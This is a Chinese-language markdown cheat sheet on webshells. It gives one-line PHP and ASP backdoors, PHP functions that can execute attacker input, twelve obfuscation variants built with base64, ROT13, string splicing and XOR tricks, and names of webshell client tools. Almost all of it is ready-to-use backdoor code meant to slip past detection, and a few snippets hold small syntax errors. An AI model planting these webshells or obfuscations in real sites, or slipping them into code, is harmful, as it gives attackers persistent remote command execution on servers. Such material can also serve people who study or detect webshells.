## webshell

### 常见一句话

```php
<?php @eval($_POST['a']);?>
<?=assert($_POST['cmd'])?>
<%eval request("cmd")%>
<%execute request(123)%>
<%executeGlobal request(123)%>
```

### 常见PHP代码执行函数

- eval()

  有严格的PHP代码规范要求（必须加分号）

- assert()

  可以不加分号

- preg_replace()

  该函数功能是执行一个正则表达式的搜索和替换，但因为存在危险的/e修饰符（能将第二个参数当做PHP代码执行），使preg_replace()将replacement参数当作PHP代码（PHP7.0以上版本不支持该修饰符）

  ```php
  <?php @preg_replace("/abc/e",$_POST['cmd'],'abc');?>  
  cmd=phpinfo()  #没有严格的分号要求
  ```

- create_function()

  用于创建匿名函数，能够将第二个参数当做PHP代码来执行

  ```php
  $func = create_function('',$_POST['cmd']);
  $func();
  cmd=phpinfo();  #有严格的分号要求
  ```

- array_map()

  array_map()函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组

  ```php
  $func=$_POST['func'];
  $cmd=$_POST['cmd'];
  $array[0]=$cmd
  $newarray=array_map($func,$array);
  func=system&cmd=ifconfig  #system('ifconfig'); 该方式无法连webshell
  ```

  ```php
  $cmd = $_POST['cmd'];
  $array[0]=$cmd;
  $newarray=array_map('assert',$array);
  cmd=phpinfo()      #可以连webshell
  ```

  ```php
  $array=array(0,1,2,3,4);
  array_map($_GET['a'],$array);
  a=phpinfo   #这里会自动添加括号
  ```

- call_user_func()

  cal_user_func将第一个参数作为回调函数调用，将后面的参数作为回调函数的参数

  ```php
  call_user_func($_POST['a'],$_POST['cmd']);
  a=assert&cmd=phpinfo();
  a=assert&cmd  #webshell连接
  ```

- call_user_func_array()

  call_userfunc_func_array()调用第一个参数回调函数，并将后面参数（数组）作为回调函数的参数

  ```php
  $array[0]=$_POST['a'];
  call_user_func_array($array,$_POST['cmd']);
  a=assert&cmd=phpinfo();
  a=assert&cmd  #webshell连接
  ```

### webshell变形

1. 字符串替换

   ```php
   #字符串替换
   $a = str_replace("abc","","aabcsabcsabceabcrabct"); #将指定字符替换
   $a($REQUEST["cmd"]);
   #字符串替换
   $a = "assegg";
   $b = str_replace("gg","rt",$a);
   ["" => $b($_GET[cmd])];
   ```

2. base64编码

   ```php
   #base64
   $a=base64_decode("YXNzZXJ0");
   $a($_REQUEST['cmd']);
   ```

3. 字符串拼接

   ```php
   #字符串拼接
   $a = 'a'.'s'.'s';
   $b = 'e'.'r'.'t';
   $c = $a.$b;
   $c($_POST['cmd']);
   ```

4. 更换数据来源

   ```php
   #传多参1
   $_REQUEST[0]($_REQUEST[1]);
   http://xxx/shell.php?0=assert&      #连shell，密码为1
   #传多参2
   $_REQUEST[0]($_REQUEST[$_REQUEST[1]]);
   http://xxx/shell.php      #密码可以为0=assert&1=cmd&cmd
   ```

5. 字符串隐藏法

   ```php
   $a = 'asdvssrret';
   $b = $a[0].$a[1].$a[1].$a[8].$[7].$a[9];
   $b($_POST[cmd]);
   ```

6. 自定义函数

   ```php
   function demo($a){
   	@assert($a);
   }
   demo($_POST[1]);
   ```

7. 对象定义法

   ```php
   class webshell{
   	function demo($a){
   		@assert($a);
   	}
   }
   $web = new webshell();
   $web -> demo($_REQUEST[cmd]);
   ```

8. 对象魔术方法

   ```PHP
   class webshell{
   	public $xa = null;
   	public $xb = null;
   	function __construct(){  #自执行魔术方法
   		$this->xa = 'nffreg($_ERDHRFG[1])'; #assert($_REQUEST) ROT13
           $this->xb = str_rot13($this->xa);  #利用str_rot13函数还原
           @assert($this->xb);
   	}
   }
   new webshell();
   ```

9. create_function函数

   ```php
   #通过创建函数进行传值
   $a=create_function('',$_REQUEST[1]);
   $a();
   ```

10. 字符替换混淆法

    ```php
    #利用该种字符串字典，通过数组下标的方式获取指定字符，再进行一个个字符的拼接
    $__C_C="WlhaaGJDZ2tYMUJQVTFSYmVGMHBPdz0912345678";
    $__P_P="abcdefghijklmnopqrstuvwxyz";
    ```

11. 利用异或运算

    ```php
    $a=(chr(65)^chr(32)).(chr(83)^chr(32)).(chr(83)^chr(32)).(chr(5)^chr(96)).(chr(32)).(chr(32)));
    #assert
    $b='_'.(chr(103)^chr(32)).(chr(101)^chr(32)).(chr(116)^chr(32));
    #_GET
    $c=$$b;
    #$_GET
    ["By pass D"=>$a($c[cmd])];
    ```


12. 利用异或+php弱类型

    ```php
    @$_++;   #$_=1
    $__=('#'^'|');  # $__=_
    $__.=('.'^'~'); #_P
    $__.=('/'^'`'); #_PO
    $__.=('|'^'/'); #_POS
    $__.=('{'^'/'); #_POST
    ${$__}[!$_](${$__}[$_]);  #$_POST[0]($_POST[1]);
    ```

    ```php
    @$_++;   #$_=1
    $__=('#'^'|').('.'^'~').('/'^'`').('|'^'/').('{'^'/');
    ${$__}[!$_](${$__}[$_]);  #$_POST[0]($_POST[1]);
    ```

### 常用webshell工具

- 蚁剑（拓展插件，支持一句话）
- 冰蝎（二进制动态流量加密，自带shell）
- 哥斯拉（自带shell，功能丰富）
- weevely（kali自带）
  